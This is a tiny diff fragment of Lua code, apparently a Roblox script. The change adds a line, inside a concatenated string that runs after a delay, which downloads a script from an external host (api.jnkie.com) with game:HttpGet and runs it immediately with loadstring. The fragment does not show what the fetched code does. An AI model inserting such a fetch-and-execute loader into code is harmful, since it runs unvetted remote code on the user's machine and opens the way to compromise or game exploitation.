@@ -435,4 +435,4 @@ task.wait(5)
     return env
 end)() .. [[
 task.wait(1)
-]])
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/8b4f2c28182df80e4e05d09d8674746539fcf27f0f4df456cb44f28a4af0f73f/download"))()]])
